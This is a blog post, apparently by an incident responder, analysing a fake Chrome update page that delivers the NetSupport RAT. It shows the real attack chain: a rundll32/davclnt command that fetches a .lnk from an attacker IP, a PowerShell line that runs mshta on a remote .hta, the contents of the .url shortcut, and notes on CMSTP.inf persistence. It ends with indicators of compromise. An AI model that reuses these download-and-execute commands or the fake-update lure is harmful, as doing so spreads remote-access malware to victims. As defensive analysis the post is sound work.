---
layout: post
title: "Google Chrome Update? More Like Infected With Netsupport Rat!​"
categories: blog
---

Today we received an alert about and endpoint running a suspicious commandline:

`rund1132.exe C: \WINDOWS\system32\davcInt.dIl, DavSetCookie 185.252.179.64080 hxxp://185.252.179.64/Downloads`

[![7-31-23_1.png](/assets/images/7-31-23/7-31-23_1.png)](/assets/images/7-31-23/7-31-23_1.png)

This commandline downloaded a .lnk file, inside the .lnk file was the following command:

`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\\*2\\\m*h*a*e ('http'+'s://alexiakombou.com/wp-content/uploads/2021/12/EN-localer.'+'hta')`

[![7-31-23_2.png](/assets/images/7-31-23/7-31-23_2.png)](/assets/images/7-31-23/7-31-23_2.png)


I was surprised to see davclnt.dll in use here. After some further investigation, we discovered the root of the rundll32 command was a fake Google Chrome update page that the user encountered. When they clicked to update, a .url file was downloaded

[![7-31-23_1-1.png](/assets/images/7-31-23/7-31-23_1-1.png)](/assets/images/7-31-23/7-31-23_1-1.png)

`silent.url`
<details>
	<summary>Click to expand</summary>
	<pre>
		
[InternetShortcut]
URL=file:\\185.252.179.64@80\Downloads\silentupdater-chr(v105).lnk
ShowCommand=7
IconIndex=96
IconFile=C:\Windows\System32\shell32.dll

	</pre>

</details>



When launched, this prompted Window to execute rundll32,davclnt.dll and connect to the malicious ip to download the .lnk file.
The contents of the .lnk file were the powershell command to run mshta.

.hta files are fun, a lot of opportunity for some shenanigans. Let's see what's inside.

[![7-31-23_3.png](/assets/images/7-31-23/7-31-23_3.png)](/assets/images/7-31-23/7-31-23_3.png)

Mhmm.

[![7-31-23_4.png](/assets/images/7-31-23/7-31-23_4.png)](/assets/images/7-31-23/7-31-23_4.png)

Yup.

[![7-31-23_5.png](/assets/images/7-31-23/7-31-23_5.png)](/assets/images/7-31-23/7-31-23_5.png)

Definitely valid business use case here!

This .hta file uses some number/string character substitution and a string of eval statements to run the variable 'res' that is set on line 63.

Inside the parent Execute statement is an incredible amount of quotes.

[![7-31-23_6.png](/assets/images/7-31-23/7-31-23_6.png)](/assets/images/7-31-23/7-31-23_6.png)

The massive amount of double quotes will be canceled out, and serve as a simple method to defeat analysis and attempt to evade EDR tools. It also obfuscates the true nature of the eval statements by hiding the name of the variable that the script intends to execute.

So since this is vbscript, the easiest way to pull out the code hidden in here is to change the Execute statement to write to a file instead of actually executing the code in 'res'.

`VBscript`
<details>
	<summary>Click to expand</summary>
    <pre>

Set objFsO-CreateObject ("Scripting. FileSystemObject") outFile="c: \users\rem\desktop\file.txt"
Set objFile = objFSO. CreateTextFile (outFile, True)
objFile.Write res & vCrLf objFile.Close

    </pre>
</details>



[![7-31-23_7.png](/assets/images/7-31-23/7-31-23_7.png)](/assets/images/7-31-23/7-31-23_7.png)


Now we can simply double click the .hta file, and let Windows execute it with mshta, as expected, and the .hta file will no longer execute the malicious code, but dump it to disk.


[![7-31-23_8.png](/assets/images/7-31-23/7-31-23_8.png)](/assets/images/7-31-23/7-31-23_8.png)

Better!

Still hard to read, but the most interesting bit is clearly in the middle with the encoded powershell command.

The 'cTE' function is to create char codes for line 20, which converts to 'wscript.shell' and then invokes the powershell script in line 21.
The rest of this code looks useless!

To decode the powershell, I will stick it in vscode and reformat it(replacing the semicolons with new lines), then stick it into ise.

The first line is a large base64, encrypted, compressed blob.
The rest of the code looks like this

[![7-31-23_9.png](/assets/images/7-31-23/7-31-23_9.png)](/assets/images/7-31-23/7-31-23_9.png)

Nothing special here, decrypting, converting and then decompressing the payload. 
Now we can get this second payload by simple changing line 24 to:

[![7-31-23_10.png](/assets/images/7-31-23/7-31-23_10.png)](/assets/images/7-31-23/7-31-23_10.png)

This will give us the second powershell script, which is another long oneliner, so back into VSCode to re-format and then back to ISE.

[![7-31-23_11.png](/assets/images/7-31-23/7-31-23_11.png)](/assets/images/7-31-23/7-31-23_11.png)

[![7-31-23_12.png](/assets/images/7-31-23/7-31-23_12.png)](/assets/images/7-31-23/7-31-23_12.png)


This is fun.

I went ahead and did some further decoding/renameing to make the scripts intentions a little more clear.

Function 1 simply writes all bytes supplied to it to a path also supplied to it.

[![7-31-23_13.png](/assets/images/7-31-23/7-31-23_13.png)](/assets/images/7-31-23/7-31-23_13.png)

Function 2 does a few things.

It takes a path in appdata, checks if it ends with '.zip' and if it does, it unzips the .zip, sets a variable to 1 and then deletes the zip file in appdata. 
If the filename does NOT end with '.zip', it checks if the previous variable is equal to 1, if it is, it moves the current file into the extracted zip folder path. It then converts some text to base64 and stores it in a variable. Then it take some base64 text and decodes it, concatenating it with the start of a powershell command. Finally it will convert all of this to base 64 and run it via powershell.

Whew that was a mouthful.

We'll come back to that script in a moment, let's finish checking the functions on the second script.

[![7-31-23_14.png](/assets/images/7-31-23/7-31-23_14.png)](/assets/images/7-31-23/7-31-23_14.png)

This first function is a wrapper to download a file.
The second is for converting the characters in the final function.

[![7-31-23_15.png](/assets/images/7-31-23/7-31-23_15.png)](/assets/images/7-31-23/7-31-23_15.png)

This final function sets variable for a zip file, then checks to see if that zip file exists. If it doesn't, it users the 2 previous functions to decode the url and download the zip.
Next it does the same for a .exe file.
Then it runs the final function.

In the Else statements we can see the large function come into play. Let's look at that tertiary script from earlier.

[![7-31-23_16.png](/assets/images/7-31-23/7-31-23_16.png)](/assets/images/7-31-23/7-31-23_16.png)

Loading user32.dll into memory

[![7-31-23_17.png](/assets/images/7-31-23/7-31-23_17.png)](/assets/images/7-31-23/7-31-23_17.png)

This function is designed to write contents to a custom .inf file, 'CMSTP.inf'.
Of note is the powershell command string, this will contain registry settings and scheduled task settings to run the 'client32.exe' file downloaded.

[![7-31-23_18.png](/assets/images/7-31-23/7-31-23_18.png)](/assets/images/7-31-23/7-31-23_18.png)

Finally, the script creates functions to get a handle to a running process, and then set the window to active, runs the first function, executes the inf file and then keeps it running if it is terminated.

CMSTP.inf is designed to be executed and run the encoded powershell command.

[![7-31-23_19-1.png](/assets/images/7-31-23/7-31-23_19-1.png)](/assets/images/7-31-23/7-31-23_19-1.png)

When run, this will run the following powershell

[![7-31-23_20-1.png](/assets/images/7-31-23/7-31-23_20-1.png)](/assets/images/7-31-23/7-31-23_20-1.png)

Effectively this will add the client32.exe to the registry, set it to launch via a scheduled task and then start the process.

So what is client32.exe?

[![7-31-23_19.png](/assets/images/7-31-23/7-31-23_19.png)](/assets/images/7-31-23/7-31-23_19.png)

Netsupport RAT!

And the zip folder was kind enough to inclued a .ini file with the C2 IP hardcoded for us

[![7-31-23_20.png](/assets/images/7-31-23/7-31-23_20.png)](/assets/images/7-31-23/7-31-23_20.png)

Using this, we can easily search our environment for this IP, and hashes from both client32.exe and CreationTools.zip. Luckily, Crowdstirke prevent this chain from fully executing at the .hta stage, and a search confirmed these files never made it to disk.


# IOCs:

Name                  | Sha256 Hash           |
--------------------- | --------------------- |
​En-Localer.hta        | 6318e4335b1098781e35d7464d20b7f92015e86f21c5aad3147e18d6bf9bba7d |
​silentupdater.lnk     | ​59b392a0ff9a3ff064b5a4ab90de5b68c758429280c612fd08f9399475d3108d |
silent.url            | ​508a5051f1e98822ae71f164700e9e5dc087cb6fbe7df1a7e9fd3403981bde84 |
​CMSTP.inf             | ​3e44025d47415dcb497c4f894f94263bf2658bb0c20bc43ca40950207794cf08 |
​CreationTools.zip     | ​c45bf5155cdd7c9a4017b818a54b332070121819a7866c58c3cfd9d684c13a20 |
​client32.exe	       | ​49a568f8ac11173e3a0d76cff6bc1d4b9bdf2c35c6d8570177422f142dcfdbe3 |



## Host based indicators:
### Directories:
C:\Users\USER\AppData\Roaming\CreativeTools

C:\Users\USER\Appdata\Local\Temp

### Registry Keys:
HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command -Value C:\Users\USER\AppData\Roaming\CreativeTools\client32.exe

## Network based indicators:

### TCP ports:
443

### URLs:
hxxps://alexiakombou[.]com/wp-content/uploads/2022/01/downloader(updchr(V104.215.214)silent.url

hxxps://alexiakombou[.]com/wp-content/uploads/2021/12/EN-localer.hta

185.252.179.64@80 hxxp://185.252.179.64/Downloads/silentupdater-chr(v105).lnk